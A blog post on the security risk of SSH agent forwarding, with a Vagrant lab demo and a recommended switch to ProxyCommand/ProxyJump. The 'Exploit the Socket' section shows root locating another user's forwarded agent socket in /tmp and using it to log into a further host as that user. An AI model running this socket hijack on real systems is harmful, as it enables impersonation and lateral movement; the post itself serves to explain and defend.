---
title: "SSH Agent Forwarding Vulnerability and Alternative"
slug: "ssh-agent-forwarding-vulnerability-and-alternative"
date: "2018-02-25T23:00:00.000Z"
feature_image: "/images/2018/02/openssh.gif"
author: "CJ Harries"
description: "Forwarding ssh-agents trades security for convenience. Proxying is not as simple as forwarding but does not, at first blush, expose as much of your network."
tags: 
  - ssh
  - OpenSSH
  - ssh-agent
  - ssh_config
  - ProxyCommand
  - ProxyJump
  - security
  - CLI
draft: true
---

One of the things that I really like about `ssh-agent` is its ability to forward itself to remotes. By sending the agent instead of setting keys on each box, I'm locking down access to a few machines that I know and trust. It's amazingly convenient and has saved me so much headache.

As I was doing research for a previous post, I kept seeing hints that maybe forwarding the agent isn't actually a very good idea. `man ssh` quite explicitly cautions users against forwarding. `man ssh_config` repeats the same warning. `man ssh-agent` goes so far as to say it "is easily abused."

<p class="nav-p"><a id="post-nav"></a></p>

- [The Vulnerability](#thevulnerability)
- [Example](#example)
  - [Setup](#setup)
  - [Forward an Agent](#forwardanagent)
  - [Exploit the Socket](#exploitthesocket)
- [Alternative](#alternative)
- [Recap](#recap)
- [Full Scripts](#fullscripts)
  - [`keygen`](#keygen)
  - [`Vagrantfile`](#vagrantfile)
- [Legal](#legal)

## The Vulnerability

In order to forward authentication requests, `ssh` creates a UNIX-domain socket between the machines. This is not an open port governed by network protocols, but rather a pathname managed by the kernel. On either end, access to the socket is limited by file and directory permissions. On the remote, this means only the owning user has access to it.

Also `root`. It's easy to forget that `root` has access to everything. By extension, this means anyone with `root` access has access to private sockets. If `root` can get there, anyone that can act as `root` can get there too.

The socket is fairly easy to discover once you know what you're looking for.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><tr><td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="gp" style="color:#66d9ef">$</span> find /tmp -path <span class="s1" style="color:#e6db74">'*ssh*'</span> -type s<br><span class="go" style="color:#888">/tmp/ssh-20mMR4ptdrVJ/agent.2283</span><br><span class="gp" style="color:#66d9ef">$</span> find /tmp -name <span class="s1" style="color:#e6db74">'agent*'</span><br><span class="go" style="color:#888">/tmp/ssh-20mMR4ptdrVJ/agent.2283</span><br><span class="gp" style="color:#66d9ef">$</span> find /tmp -type s<br><span class="go" style="color:#888">...</span><br><span class="go" style="color:#888">/tmp/ssh-20mMR4ptdrVJ/agent.2283</span><br><span class="go" style="color:#888">...</span><br></pre></div>
</td></tr></table>

By setting your environment's `SSH_AUTH_SOCK`, you can gain access to the agent. There's not much information you can gain from the socket itself.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><tr><td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="gp" style="color:#66d9ef">$</span> sudo <span class="nv" style="color:#f8f8f2">SSH_AUTH_SOCK</span><span class="o" style="color:#f92672">=</span>/tmp/ssh-20mMR4ptdrVJ/agent.2283 ssh-add -l<br><span class="go" style="color:#888">2048 SHA256:7Fd0YO1OENizISLV+rzBHc+KHpsDKnfkZoPEOKNoGt4 user01@host (RSA)</span><br></pre></div>
</td></tr></table>

You can, however, authenticate as the compromised user anywhere the compromised agent can take you. That's the danger. The current machine might be safe (barring some situations) but everything connected to it is not.

## Example

I really struggled to wrap my head around this initially. I mean, I understand `root` can get anywhere. I just didn't see the implications. To grok the issue, I put together a demo. It's slightly contrived, but it gets the job done. The final steps especially will probably take more time in the real world. They were easier with full knowledge of the network.

### Setup

`miller` and `holden` are two users on a network.

* Both have simple access to `mars`
* `miller` has `sudo` on `ceres` while `holden` connects via a service account
* `holden` has `sudo` on `earth` while `miller` connects via a service account

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><tr><td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="gp" style="color:#66d9ef">$</span> vagrant ssh-config<br><span class="go" style="color:#888">Host ceres</span><br><span class="go" style="color:#888">  HostName 192.168.121.85</span><br><span class="go" style="color:#888">  ...</span><br><br><span class="go" style="color:#888">Host earth</span><br><span class="go" style="color:#888">  HostName 192.168.121.186</span><br><span class="go" style="color:#888">  ...</span><br><br><span class="go" style="color:#888">Host mars</span><br><span class="go" style="color:#888">  HostName 192.168.121.19</span><br><span class="go" style="color:#888">  ...</span><br></pre></div>
</td></tr></table>

### Forward an Agent

To begin, `holden` loads credentials in `ssh-agent` and connects to `ceres`, forwarding the agent.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><tr><td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="gp" style="color:#66d9ef">$</span> vagrant ssh earth<br><span class="go" style="color:#888">Last login: Sun Feb 25 19:25:08 2018</span><br><span class="gp" style="color:#66d9ef">[vagrant@earth ~]$</span> sudo su - holden<br><span class="gp" style="color:#66d9ef">[holden@earth ~]$</span> <span class="nb" style="color:#f8f8f2">eval</span> <span class="sb" style="color:#e6db74">`</span>ssh-agent<span class="sb" style="color:#e6db74">`</span><br><span class="go" style="color:#888">Agent pid 2114</span><br><span class="gp" style="color:#66d9ef">[holden@earth ~]$</span> ssh-add -l<br><span class="go" style="color:#888">The agent has no identities.</span><br><span class="gp" style="color:#66d9ef">[holden@earth ~]$</span> ssh-add<br><span class="go" style="color:#888">Enter passphrase for /home/holden/.ssh/id_rsa:</span><br><span class="go" style="color:#888">Identity added: /home/holden/.ssh/id_rsa (/home/holden/.ssh/id_rsa)</span><br><span class="gp" style="color:#66d9ef">[holden@earth ~]$</span> ssh -A service@ceres<br><span class="go" style="color:#888">The authenticity of host 'ceres (172.28.128.183)' can't be established.</span><br><span class="go" style="color:#888">ECDSA key fingerprint is SHA256:zT5jk515i96BlVCQHPCDkba/4DVDdn+rq728pRma2J4.</span><br><span class="go" style="color:#888">ECDSA key fingerprint is MD5:32:67:6e:7a:88:1d:ea:f0:7d:8a:e9:44:b8:20:d7:98.</span><br><span class="go" style="color:#888">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="go" style="color:#888">Warning: Permanently added 'ceres,172.28.128.183' (ECDSA) to the list of known hosts.</span><br><span class="gp" style="color:#66d9ef">[service@ceres ~]$</span><br></pre></div>
</td></tr></table>

### Exploit the Socket

With the exposed agent on `ceres`, `miller` abuses superuser privileges to access the socket and subsequently connects to `mars` as `holden`.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><tr><td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="gp" style="color:#66d9ef">$</span> vagrant ssh ceres<br><span class="gp" style="color:#66d9ef">[vagrant@ceres ~]$</span> sudo su - miller<br><span class="gp" style="color:#66d9ef">[miller@ceres ~]$</span> ls -lh /tmp <span class="p">|</span> grep ssh<br><span class="go" style="color:#888">drwx------. 2 service service 4.0K Feb 25 19:35 ssh-b1ztr2bh4c</span><br><span class="gp" style="color:#66d9ef">[miller@ceres ~]$</span> ls -lh /tmp/ssh-b1ztr2bh4c/<br><span class="go" style="color:#888">ls: cannot open directory '/tmp/ssh-b1ztr2bh4c/': Permission denied</span><br><span class="gp" style="color:#66d9ef">[miller@ceres ~]$</span> sudo ls -lh /tmp/ssh-b1ztr2bh4c/<br><br><span class="go" style="color:#888">We trust you have received the usual lecture from the local System</span><br><span class="go" style="color:#888">Administrator. It usually boils down to these three things:</span><br><br><span class="gp" style="color:#66d9ef">    #</span><span class="m" style="color:#ae81ff">1</span><span class="o" style="color:#f92672">)</span> Respect the privacy of others.<br><span class="gp" style="color:#66d9ef">    #</span><span class="m" style="color:#ae81ff">2</span><span class="o" style="color:#f92672">)</span> Think before you type.<br><span class="gp" style="color:#66d9ef">    #</span><span class="m" style="color:#ae81ff">3</span><span class="o" style="color:#f92672">)</span> With great power comes great responsibility.<br><br><span class="go" style="color:#888">[sudo] password for miller:</span><br><span class="go" style="color:#888">total 0</span><br><span class="go" style="color:#888">srwxr-xr-x. 1 service service 0 Feb 25 19:35 agent.2071</span><br><span class="gp" style="color:#66d9ef">[miller@ceres ~]$</span> sudo <span class="nv" style="color:#f8f8f2">SSH_AUTH_SOCK</span><span class="o" style="color:#f92672">=</span>/tmp/ssh-b1ztr2bh4c/agent.2071 ssh-add -l<br><span class="go" style="color:#888">2048 SHA256:FEEeeefRwEEaXEiIMO8hcSVeIw7gjvKMsRijtUwWA6c /home/holden/.ssh/id_rsa (RSA)</span><br><span class="gp" style="color:#66d9ef">[miller@ceres ~]$</span>  sudo <span class="nv" style="color:#f8f8f2">SSH_AUTH_SOCK</span><span class="o" style="color:#f92672">=</span>/tmp/ssh-b1ztr2bh4c/agent.2071 ssh holden@mars<br><span class="go" style="color:#888">The authenticity of host 'mars (172.28.128.54)' can't be established.</span><br><span class="go" style="color:#888">ECDSA key fingerprint is SHA256:0olL+aPBBEKDqgrvAAsJFC6Ib4atSqZPztlmNr/qzz4.</span><br><span class="go" style="color:#888">ECDSA key fingerprint is MD5:ad:63:ba:56:65:f6:83:d5:81:1f:92:5f:bc:45:6e:0b.</span><br><span class="go" style="color:#888">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="go" style="color:#888">Warning: Permanently added 'mars,172.28.128.54' (ECDSA) to the list of known hosts.</span><br><span class="gp" style="color:#66d9ef">[holden@mars ~]$</span><br></pre></div>
</td></tr></table>

I'll leave the rest up to your imagination.

## Alternative

`ProxyCommand` is [the generally accepted alternative](https://heipei.github.io/2015/02/26/SSH-Agent-Forwarding-considered-harmful/#the-alternative-proxycommand-to-the-rescue). Rather than leave a trail of open sockets, you tunnel your way to the desired machine [via direct connections](https://askubuntu.com/a/504148). You can, in theory, chain as many as you'd like.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%">
<tr class="code-header" style="height:40px; padding:5px 0 0" height="40">
<td style="border:none; background-image:none; background-position:center; background-repeat:no-repeat"></td>
<td class="code-header" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; height:40px; padding:5px 0 0" height="40"><div class="code-tab active" style="color:#f8f8f2; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px; border-bottom:1px solid #57584f" height="35">~/.ssh/config</div></td>
</tr>
<tr>
<td class="linenos" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0"><div class="linenodiv"><pre style="background:#272822; color:#57584f; border:none; font-size:1em; line-height:125%; padding:0 10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0; border-radius:0; border-right:1px solid #57584f">1
2
3
4
5
6</pre></div></td>
<td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span>Host start<br>    HostName start.fqdn<br><br>Host end<br>    HostName end.fqdn<br>    ProxyCommand ssh -W %h:%p start<br></pre></div>
</td>
</tr>
</table>

`start` is straightforward. It just defines an easy way to get to `start.fqdn`. `end` does a bit more with `ProxyCommand`. Instead of connecting directly, it forwards client I/O to `%h`ost on `%p`ort via `start`.

Depending on where you double-check this post, you might run into `nc`/`netcat` usage. It's still presented as a current solution in many places (including the man pages for OpenSSH 7.6!). However, it was superceded by `-W %h:%p` [in OpenSSH 5.4](http://www.openssh.com/releasenotes.html#5.4), released almost ten years ago. `-W` is OpenSSH's `netcat` mode.

Depending on how new your version of OpenSSH is, you might notice `ProxyJump` while poking around the documentation. [OpenSSH 7.3](http://www.openssh.com/releasenotes.html#7.3) introduced the option, which simplifies the chaining process. `ProxyJump` and `ProxyCommand` are mutually exclusive (I believe it's first-come-first-served), so you can't use both. For this situation, where we're just trying to maintain an encrypted connection between us and a far-flung remote, [`ProxyJump` is perfect](https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Proxies_and_Jump_Hosts#Jump_Hosts_--_Passing_Through_a_Gateway_or_Two). It can be chained in a single line, making lengthy proxy chains more manageable.

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%">
<tr class="code-header" style="height:40px; padding:5px 0 0" height="40">
<td style="border:none; background-image:none; background-position:center; background-repeat:no-repeat"></td>
<td class="code-header" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; height:40px; padding:5px 0 0" height="40"><div class="code-tab active" style="color:#f8f8f2; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px; border-bottom:1px solid #57584f" height="35">~/.ssh/config</div></td>
</tr>
<tr>
<td class="linenos" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0"><div class="linenodiv"><pre style="background:#272822; color:#57584f; border:none; font-size:1em; line-height:125%; padding:0 10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0; border-radius:0; border-right:1px solid #57584f"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td>
<td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span>Host start<br>    HostName start.fqdn<br><br>Host middle<br>    HostName middle.fqdn<br>    ProxyJump start<br><br>Host end<br>    HostName end.fqdn<br>    ProxyJump start,middle<br></pre></div>
</td>
</tr>
</table>

## Recap

Forwarding `ssh-agent`s, like many things in life, trades security for convenience. With minimal time investment, forwarding can be replaced by `Proxy(Command|Jump)`. Proxying is not as simple as forwarding but does not, at first blush, expose as much of your network.

## Full Scripts

These are in [the repo](https://github.com/thecjharries/posts-ssh-agent-vulnerability) but I also wanted to lay out everything here.

### `keygen`

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%">
<tr class="code-header" style="height:40px; padding:5px 0 0" height="40">
<td style="border:none; background-image:none; background-position:center; background-repeat:no-repeat"></td>
<td class="code-header" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; height:40px; padding:5px 0 0" height="40">
<div class="code-tab active" style="color:#f8f8f2; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px; border-bottom:1px solid #57584f" height="35">keygen</div>
<div class="code-tab" style="color:#57584f; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px" height="35"><a target="_blank" href="https://github.com/thecjharries/posts-ssh-agent-vulnerability/tree/master/keys/keygen" style="color:inherit; display:block; position:relative; text-decoration:none">view source <i class="fa fa-external-link" style="color:inherit; height:35px; line-height:35px" height="35"></i></a></div>
</td>
</tr>
<tr>
<td class="linenos" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0"><div class="linenodiv"><pre style="background:#272822; color:#57584f; border:none; font-size:1em; line-height:125%; padding:0 10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0; border-radius:0; border-right:1px solid #57584f">1
2
3
4</pre></div></td>
<td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="ch" style="color:#75715e">#!/bin/bash</span><br><br>ssh-keygen -t rsa -P belter -C miller@ceres -f miller<br>ssh-keygen -t rsa -P hauler -C holden@earth -f holden<br></pre></div>
</td>
</tr>
</table>

### `Vagrantfile`

<table class="highlighttable" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%">
<tr class="code-header" style="height:40px; padding:5px 0 0" height="40">
<td style="border:none; background-image:none; background-position:center; background-repeat:no-repeat"></td>
<td class="code-header" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; height:40px; padding:5px 0 0" height="40">
<div class="code-tab active" style="color:#f8f8f2; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px; border-bottom:1px solid #57584f" height="35">Vagrantfile</div>
<div class="code-tab" style="color:#57584f; display:inline-block; font-size:0.9em; height:35px; line-height:35px; margin:0 30px 0 0; padding:0 5px" height="35"><a target="_blank" href="https://github.com/thecjharries/posts-ssh-agent-vulnerability/tree/master/Vagrantfile" style="color:inherit; display:block; position:relative; text-decoration:none">view source <i class="fa fa-external-link" style="color:inherit; height:35px; line-height:35px" height="35"></i></a></div>
</td>
</tr>
<tr>
<td class="linenos" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0"><div class="linenodiv"><pre style="background:#272822; color:#57584f; border:none; font-size:1em; line-height:125%; padding:0 10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0; border-radius:0; border-right:1px solid #57584f"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92</pre></div></td>
<td class="code" style="border:none; background-image:none; background-position:center; background-repeat:no-repeat; padding:10px 0">
<div class="highlight" style='border-radius:5px; display:block; font-family:Consolas, "Courier New", monospace; min-width:300px; overflow:auto; width:100%; background:#272822; color:#f8f8f2' width="100%"><pre style="background:#272822; color:#f8f8f2; border:none; font-size:1em; line-height:125%; padding:10px; margin-bottom:0; margin-top:0; padding-bottom:0; padding-top:0"><span></span><span class="c1" style="color:#75715e"># -*- mode: ruby -*-</span><br><span class="c1" style="color:#75715e"># vi: set ft=ruby :</span><br><br><span class="no" style="color:#66d9ef">Vagrant</span><span class="o" style="color:#f92672">.</span><span class="n">configure</span><span class="p">(</span><span class="s2" style="color:#e6db74">"2"</span><span class="p">)</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">config</span><span class="o" style="color:#f92672">|</span><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">box</span> <span class="o" style="color:#f92672">=</span> <span class="s2" style="color:#e6db74">"fedora/27-cloud-base"</span><br><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">provision</span> <span class="s2" style="color:#e6db74">"shell"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">shell</span><span class="o" style="color:#f92672">|</span><br>        <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">privileged</span> <span class="o" style="color:#f92672">=</span> <span class="kp" style="color:#66d9ef">true</span><br>        <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">inline</span> <span class="o" style="color:#f92672">=</span> <span class="o" style="color:#f92672">&lt;&lt;-</span><span class="dl" style="color:#e6db74">SHELL</span><br><span class="sh" style="color:#e6db74">        sed -i \</span><br><span class="sh" style="color:#e6db74">            -e 's/PermitRootLogin/#PermitRootLogin/g' \</span><br><span class="sh" style="color:#e6db74">            -e 's/#MaxAuthTries 6/MaxAuthTries 3/g' \</span><br><span class="sh" style="color:#e6db74">            -e 's/PasswordAuthentication yes/PasswordAuthentication no/g' \</span><br><span class="sh" style="color:#e6db74">            /etc/ssh/sshd_config</span><br><span class="sh" style="color:#e6db74">        systemctl restart sshd</span><br><span class="dl" style="color:#e6db74">        SHELL</span><br>    <span class="k" style="color:#66d9ef">end</span><br><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">network</span> <span class="s2" style="color:#e6db74">"private_network"</span><span class="p">,</span> <span class="ss" style="color:#e6db74">type</span><span class="p">:</span> <span class="s2" style="color:#e6db74">"dhcp"</span><br><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">define</span> <span class="s2" style="color:#e6db74">"ceres"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">ceres</span><span class="o" style="color:#f92672">|</span><br>        <span class="n">ceres</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">hostname</span> <span class="o" style="color:#f92672">=</span> <span class="s2" style="color:#e6db74">"ceres"</span><br><br>        <span class="n">ceres</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">provision</span> <span class="s2" style="color:#e6db74">"shell"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">shell</span><span class="o" style="color:#f92672">|</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">privileged</span> <span class="o" style="color:#f92672">=</span> <span class="kp" style="color:#66d9ef">true</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">inline</span> <span class="o" style="color:#f92672">=</span> <span class="o" style="color:#f92672">&lt;&lt;-</span><span class="dl" style="color:#e6db74">SHELL</span><br><span class="sh" style="color:#e6db74">            useradd -G wheel miller</span><br><span class="sh" style="color:#e6db74">            echo belter | passwd miller --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/miller/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/miller/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/miller /home/miller/.ssh/id_rsa</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/miller.pub /home/miller/.ssh/id_rsa.pub</span><br><span class="sh" style="color:#e6db74">            chown -R miller:miller /home/miller/.ssh</span><br><span class="sh" style="color:#e6db74">            useradd service</span><br><span class="sh" style="color:#e6db74">            echo some_pass | passwd service --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/service/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/service/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/holden.pub /home/service/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rw,go=' /home/service/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chown -R service:service /home/service/.ssh</span><br><span class="dl" style="color:#e6db74">            SHELL</span><br>        <span class="k" style="color:#66d9ef">end</span><br>    <span class="k" style="color:#66d9ef">end</span><br><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">define</span> <span class="s2" style="color:#e6db74">"earth"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">earth</span><span class="o" style="color:#f92672">|</span><br>        <span class="n">earth</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">hostname</span> <span class="o" style="color:#f92672">=</span> <span class="s2" style="color:#e6db74">"earth"</span><br><br>        <span class="n">earth</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">provision</span> <span class="s2" style="color:#e6db74">"shell"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">shell</span><span class="o" style="color:#f92672">|</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">privileged</span> <span class="o" style="color:#f92672">=</span> <span class="kp" style="color:#66d9ef">true</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">inline</span> <span class="o" style="color:#f92672">=</span> <span class="o" style="color:#f92672">&lt;&lt;-</span><span class="dl" style="color:#e6db74">SHELL</span><br><span class="sh" style="color:#e6db74">            useradd -G wheel holden</span><br><span class="sh" style="color:#e6db74">            echo hauler | passwd holden --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/holden/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/holden/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/holden /home/holden/.ssh/id_rsa</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/holden.pub /home/holden/.ssh/id_rsa.pub</span><br><span class="sh" style="color:#e6db74">            chown -R holden:holden /home/holden/.ssh</span><br><span class="sh" style="color:#e6db74">            useradd service</span><br><span class="sh" style="color:#e6db74">            echo some_pass | passwd service --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/service/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/service/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/miller.pub /home/service/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rw,go=' /home/service/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chown -R service:service /home/service/.ssh</span><br><span class="dl" style="color:#e6db74">            SHELL</span><br>        <span class="k" style="color:#66d9ef">end</span><br>    <span class="k" style="color:#66d9ef">end</span><br><br>    <span class="n">config</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">define</span> <span class="s2" style="color:#e6db74">"mars"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">mars</span><span class="o" style="color:#f92672">|</span><br>        <span class="n">mars</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">hostname</span> <span class="o" style="color:#f92672">=</span> <span class="s2" style="color:#e6db74">"mars"</span><br><br>        <span class="n">mars</span><span class="o" style="color:#f92672">.</span><span class="n">vm</span><span class="o" style="color:#f92672">.</span><span class="n">provision</span> <span class="s2" style="color:#e6db74">"shell"</span> <span class="k" style="color:#66d9ef">do</span> <span class="o" style="color:#f92672">|</span><span class="n">shell</span><span class="o" style="color:#f92672">|</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">privileged</span> <span class="o" style="color:#f92672">=</span> <span class="kp" style="color:#66d9ef">true</span><br>            <span class="n">shell</span><span class="o" style="color:#f92672">.</span><span class="n">inline</span> <span class="o" style="color:#f92672">=</span> <span class="o" style="color:#f92672">&lt;&lt;-</span><span class="dl" style="color:#e6db74">SHELL</span><br><span class="sh" style="color:#e6db74">            useradd miller</span><br><span class="sh" style="color:#e6db74">            echo belter | passwd miller --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/miller/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/miller/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/miller.pub /home/miller/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rw,go=' /home/miller/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chown -R miller:miller /home/miller/.ssh</span><br><span 